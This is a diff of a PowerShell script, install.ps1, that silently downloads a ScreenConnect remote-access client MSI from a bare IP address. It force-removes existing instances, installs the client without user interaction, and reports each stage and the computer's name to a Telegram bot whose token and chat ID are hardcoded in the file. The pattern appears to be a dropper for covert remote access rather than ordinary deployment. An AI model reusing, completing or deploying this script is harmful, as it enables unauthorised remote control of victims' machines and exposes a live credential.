@@ -1,6 +1,6 @@
 # ==============================================================================
 # Script Name: install.ps1
-# Description: Universal Dynamic Silent Installer Optimized for Faronics Deploy
+# Description: Fixed ScreenConnect silent installer with Dynamic URI Extraction
 # ==============================================================================
 
 # Force PowerShell output to treat text as UTF-8
@@ -12,16 +12,19 @@ $BotToken = "8804791627:AAG1vTmc-HlAW8DR0gzKezeKidm4W3DwmXY"
 $ChatID   = "6867549905"
 
 # 2. APPLICATION CONFIGURATION - PASTE ANY MSI LINK HERE
-$MsiUrl    = "http://50.114.179"
+$MsiUrl    = "http://50.114.179.239/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
 $TempDir   = "C:\Windows\Temp"
 
 # --- NATIVE URI FILENAME EXTRACTION (No String Splitting) ---
 $UriObject   = [System.Uri]$MsiUrl
 $FileName    = [System.IO.Path]::GetFileName($UriObject.AbsolutePath)
-$AppName     = [System.IO.Path]::GetFileNameWithoutExtension($UriObject.AbsolutePath)
+$BaseName    = [System.IO.Path]::GetFileNameWithoutExtension($UriObject.AbsolutePath)
+
+# Isolate the primary name (e.g., extracts "ScreenConnect" instead of "ScreenConnect.ClientSetup")
+$AppName     = $BaseName.Split('.')[0]
 
 # Fallback validation if the URL structure doesn't expose a clear .msi name
-if ($FileName -notlike "*.msi") {
+if ($FileName -notlike "*.msi" -or [string]::IsNullOrEmpty($AppName)) {
     $FileName = "downloaded_package.msi"
     $AppName  = "CustomApplication"
 }
@@ -42,7 +45,7 @@ function Send-TelegramAlert {
             text    = $Message
         } | ConvertTo-Json -Compress -Depth 2
 
-        Invoke-RestMethod -Uri "https://telegram.org" `
+        Invoke-RestMethod -Uri "https://api.telegram.org/bot$BotToken/sendMessage" `
                           -Method Post `
                           -ContentType "application/json; charset=utf-8" `
                           -Body $Payload -ErrorAction Stop | Out-Null
@@ -54,40 +57,32 @@ function Send-TelegramAlert {
 # --- MILESTONE 1: SCRIPT LAUNCH ---
 Send-TelegramAlert -Message "[🚀] $AppName Script Launched!`nPC: $Computer`nStatus: Starting system environmental pre-checks..."
 
-# 3. ANTI-1603 CONFLICT CLEANUP (Fast Registry Sweeper - Bypasses Win32_Product)
+# 3. ANTI-1603 CONFLICT CLEANUP (Runs before installation)
 try {
-    Write-Output "Stopping any existing background services..."
+    Write-Output "Stopping any existing $AppName services..."
     Get-Service -Name "*$AppName*" -ErrorAction SilentlyContinue | Stop-Service -Force -ErrorAction SilentlyContinue
     Get-Process -Name "*$AppName*" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
 
-    Write-Output "Scanning system registries to remove older conflicting $AppName packages..."
-    # Scans the safe, instant Registry paths instead of querying the WMI engine
-    $RegPaths = @(
-        "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*",
-        "HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"
-    )
-    $OldApps = Get-ItemProperty $RegPaths -ErrorAction SilentlyContinue | 
-               Where-Object { $_.DisplayName -like "*$AppName*" -and $_.UninstallString -like "*msiexec*" }
-
-    foreach ($App in $OldApps) {
-        $IdentifyingNumber = $App.PSChildName
-        Write-Output "Uninstalling existing client GUID: $IdentifyingNumber"
-        Send-TelegramAlert -Message "[🗑️] Conflict Found: Removing old version ($($App.DisplayName)) on PC: $Computer"
-        Start-Process -FilePath "msiexec.exe" -ArgumentList "/x $IdentifyingNumber /qn /norestart" -Wait -NoNewWindow
+    Write-Output "Removing old $AppName instances to prevent 1603 errors..."
+    Get-CimInstance -ClassName Win32_Product -Filter "Name LIKE '%$AppName%'" -ErrorAction SilentlyContinue | ForEach-Object {
+        Write-Output "Uninstalling existing client: $($_.Name)"
+        # Instant alert if an existing installation conflict is actively being purged
+        Send-TelegramAlert -Message "[🗑️] Conflict Found: Removing old client ($($_.Name)) on PC: $Computer"
+        Invoke-CimMethod -InputObject $_ -MethodName "Uninstall" -ErrorAction SilentlyContinue
     }
 } catch {
     Write-Output "Pre-cleanup encountered an issue but proceeding anyway: $_"
 }
 
 # --- MILESTONE 2: DOWNLOAD INITIATION ---
-Send-TelegramAlert -Message "[📥] Download Started`nPC: $Computer`nStatus: Fetching the $FileName package..."
+Send-TelegramAlert -Message "[📥] Download Started`nPC: $Computer`nStatus: Fetching the $FileName setup package..."
 
 # 4. Download Logic
 try {
-    Write-Output "Downloading MSI package..."
+    Write-Output "Downloading $AppName MSI..."
     if (Test-Path $MsiPath) { Remove-Item $MsiPath -Force -ErrorAction SilentlyContinue }
 
-    # Downloads using your raw unedited $MsiUrl string directly
+    # Downloads using your raw unedited $MsiUrl string variable directly
     Invoke-WebRequest -Uri $MsiUrl -OutFile $MsiPath -UseBasicParsing -ErrorAction Stop
 
     if (-not (Test-Path $MsiPath) -or (Get-Item $MsiPath).Length -lt 1024) {
@@ -102,7 +97,7 @@ catch {
 }
 
 # --- MILESTONE 3: INSTALLATION INITIATION ---
-Send-TelegramAlert -Message "[🛠️] Installation Started`nPC: $Computer`nStatus: Handing the $FileName package to the silent background execution engine..."
+Send-TelegramAlert -Message "[🛠️] Installation Started`nPC: $Computer`nStatus: Handing the $FileName binary package to the silent background execution engine..."
 
 # 5. Installation Logic
 if (Test-Path $MsiPath) {
